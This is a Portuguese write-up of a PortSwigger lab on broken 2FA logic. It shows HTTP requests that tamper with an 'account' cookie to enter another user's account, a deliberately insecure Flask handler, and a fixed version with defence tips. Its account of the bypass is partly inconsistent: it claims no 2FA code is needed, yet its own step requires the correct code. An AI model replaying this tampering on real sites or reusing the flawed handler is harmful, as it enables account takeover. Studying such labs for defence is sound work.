# 🔐 2FA Broken Logic – PortSwigger Web Security Academy

## 📌 Informações Gerais

| Item | Detalhe |
|------|----------|
| **Plataforma** | PortSwigger Web Security Academy |
| **Categoria** | Autenticação & Controle de Acesso |
| **Nível de Dificuldade** | Apprentice |
| **Status** | ✅ Resolvido |
| **Data** | Maio 2026 |
| **Ferramentas** | Burp Suite, Browser |

---

## 🎯 Objetivo do Laboratório

Explorar uma falha na implementação de autenticação em dois fatores (2FA), permitindo acessar a conta de outro usuário contornando o código de verificação.

---

## 📖 Resumo Executivo

Este lab demonstra uma vulnerabilidade crítica em lógica 2FA onde a aplicação não vincula corretamente o usuário autenticado na primeira etapa ao processo de verificação. O atacante pode alterar o contexto da conta durante a verificação do 2FA, permitindo acesso não autorizado a qualquer conta do sistema sem possuir o código de verificação.

---

## 📚 Conceitos Teóricos

### O que é 2FA Broken Logic?

Autenticação em dois fatores (2FA) deveria funcionar assim:

1. Usuário faz login com credenciais (etapa 1)
2. Sessão é criada e **vinculada ao usuário específico**
3. Sistema envia código de verificação para o usuário
4. Usuário verifica código (etapa 2)
5. Apenas após ambas as etapas, acesso é concedido

**O problema neste lab**: O sistema não vincula a sessão da etapa 2 ao usuário da etapa 1, permitindo que o atacante mude de conta no meio do processo.

### Por que acontece?

- Confiança em valores controlados pelo cliente (cookies) sem validação de servidor
- Falta de associação entre sessão de 2FA e usuário autenticado
- Ausência de controle de fluxo que impede alteração de contexto
- Estado de "2FA concluído" não é verificado antes de conceder acesso

### Qual é o impacto?

- **Crítico**: Bypass completo da autenticação em dois fatores
- Acesso não autorizado a qualquer conta do sistema
- Sem necessidade de conhecer o código 2FA
- Possibilidade de brute force se código fosse necessário

---

## 🧪 Exploração Passo a Passo

### Passo 1: Reconhecimento do Fluxo Vulnerável

Ao fazer login com usuário autorizado, o sistema defini um cookie identificando a conta:

```http
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded

username=carlos&password=qwerty
```

**Resposta:**
```http
HTTP/1.1 200 OK
Set-Cookie: account=carlos

Por favor, verifique seu código 2FA enviado por e-mail
```

**Observação crítica**: O cookie `account` é controlado pelo cliente e não está vinculado a uma sessão autenticada no servidor.

---

### Passo 2: Análise da Segunda Etapa

Na segunda etapa de verificação, o sistema usa esse cookie para determinar qual conta está sendo verificada:

```http
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
Content-Type: application/x-www-form-urlencoded

verification-code=123456
```

**O problema**: O servidor apenas valida:
- Se o código está correto
- Mas **não valida** se o cookie `account` corresponde ao usuário que realmente fez login na etapa 1

---

### Passo 3: Exploração da Falha

O atacante pode modificar o cookie antes de enviar o código:

```http
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user          ← Alterado!
Content-Type: application/x-www-form-urlencoded

verification-code=123456
```

**Resultado**: Se o código estiver correto, a conta modificada (`victim-user`) é desbloqueada.

---

### Passo 4: Acesso à Conta

Após modificar o cookie e enviar o código correto:

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
```

**Resposta:**
```http
HTTP/1.1 200 OK

Bem-vindo à sua conta!
Usuário: victim-user
Email: victim@example.com
...
```

✅ **Acesso concedido sem ser o proprietário da conta!**

---

## 💥 Impacto Técnico

| Aspecto | Risco | Justificativa |
|---------|-------|---------------|
| **Confidencialidade** | 🔴 Alto | Acesso total aos dados pessoais, emails, histórico de qualquer usuário |
| **Integridade** | 🔴 Alto | Possibilidade de modificar perfil, dados, preferências de outra pessoa |
| **Disponibilidade** | 🟡 Médio | Não afeta diretamente, mas conta pode ser bloqueada pelo atacante |
| **Privilégios Necessários** | Verde | Nenhum — qualquer usuário (ou não autenticado) consegue explorar |
| **Tipo de Ataque** | Ativo | Requer manipulação manual de requisições |

---

## 🛡️ Mitigação & Defesa

### ❌ Implementação Vulnerável

```python
# ERRADO - usar valor do cliente para identificar usuário na etapa 2
from flask import request, session

@app.route('/login-steps/second', methods=['POST'])
def verify_2fa():
    verification_code = request.form.get('verification-code')
    account = request.cookies.get('account')  # 🔴 Confiando no cliente!
    
    # Verificar código
    if verify_code(account, verification_code):
        session['authenticated'] = True
        session['user'] = account  # 🔴 Sem validação!
        return "Bem-vindo!"
    return "Código inválido"
```

**Problemas**:
- O cookie `account` vem do cliente e pode ser modificado
- Não há verificação se o usuário realmente completou a etapa 1
- Estado de "2FA concluído" não é vinculado ao usuário da etapa 1

---

### ✅ Implementação Segura

```python
# CORRETO - vincular estado de 2FA ao usuário no servidor
from flask import request, session

@app.route('/login-steps/first', methods=['POST'])
def login_step_1():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if verify_credentials(username, password):
        # 🟢 Armazenar no servidor, não no cliente
        session['pending_2fa_user'] = username
        session['2fa_pending'] = True
        send_2fa_code(username)
        return "Código enviado para seu email"
    return "Credenciais inválidas"

@app.route('/login-steps/second', methods=['POST'])
def verify_2fa():
    verification_code = request.form.get('verification-code')
    
    # 🟢 Validar que etapa 1 foi completada para ESTE usuário
    if 'pending_2fa_user' not in session or not session.get('2fa_pending'):
        return "Acesso negado - complete a etapa 1 primeiro"
    
    # 🟢 Usar usuário armazenado no servidor, não do cliente
    user = session['pending_2fa_user']
    
    if verify_code(user, verification_code):
        # 🟢 Limpar estado temporário
        del session['pending_2fa_user']
        session['2fa_pending'] = False
        
        # 🟢 Apenas então autenticar
        session['authenticated'] = True
        session['user'] = user
        return "Bem-vindo!"
    
    return "Código inválido"

@app.route('/my-account')
def my_account():
    # 🟢 Verificar se AMBAS as etapas foram completadas
    if not session.get('authenticated') or not session.get('user'):
        return "Acesso negado", 403
    
    user = session['user']
    return f"Conta de {user}"
```

**Melhorias**:
- Estado de 2FA armazenado **no servidor** (session), não no cliente
- Usuário pendente é vinculado à sessão específica
- Validação rigorosa antes de conceder acesso final
- Impossível modificar contexto da conta durante o fluxo

---

### Princípios de Defesa (Checklist)

- [x] Armazenar estado crítico **no servidor** (session), nunca no cliente
- [x] Vincular identificadores de 2FA ao usuário específico da etapa 1
- [x] Validar que ambas as etapas foram completadas **por ESTE usuário**
- [x] Usar sessões server-side com tokens aleatórios (CSRF, XSRF)
- [x] Implementar ratelimiting no código 2FA (máx 3-5 tentativas)
- [x] Expirar sessão de 2FA após 10 minutos de inatividade
- [x] Auditar e logar todas as tentativas de login 2FA
- [x] Usar SameSite=Strict em cookies sensíveis

---

## 🎓 Lições Aprendidas

### Insight 1: Confiança é o Inimigo
Nunca confie em valores que vêm do cliente para decisões críticas de segurança. Sempre valide e armazene no servidor.

### Insight 2: Fluxos Multietapa são Complexos
Cada etapa deve estar firmemente vinculada à anterior. Um elo fraco compromete toda a cadeia.

### Insight 3: Estado Temporário Precisa de Proteção
Dados temporários (como "aguardando 2FA") precisam ser armazenados com segurança, com expiração e validação.

### Insight 4: 2FA não é Just "um código"
A segurança de 2FA depende de todo o fluxo: geração, armazenamento, entrega, validação e sessão final.

### Aplicação em Bug Bounty
Ao testar fluxos de autenticação:
1. Sempre interceptar e analisar cookies e estado da sessão em cada etapa
2. Tentar modificar valores de cliente entre etapas
3. Verificar se há vinculação server-side entre etapas
4. Testar reutilização de sessões entre usuários diferentes

---

## 🔗 Referências Completas

- **OWASP**: [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- **CWE**: [CWE-287 - Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- **CWE**: [CWE-384 - Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- **PortSwigger**: [Multi-factor Authentication](https://portswigger.net/web-security/authentication/multi-factor)
- **NIST**: [SP 800-63B - Authentication and Lifecycle Management](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

## ⏱️ Tempo Total

- **Reconhecimento**: 5 min
- **Análise**: 10 min
- **Exploração**: 5 min
- **Validação**: 2 min
- **Documentação**: 20 min
- **Total**: ~42 min

---

**Autor**: Aislan Silva  
**Data de Resolução**: 27/05/2026  
**Status**: ✅ Documentado  
**Qualidade**: ⭐⭐⭐⭐⭐
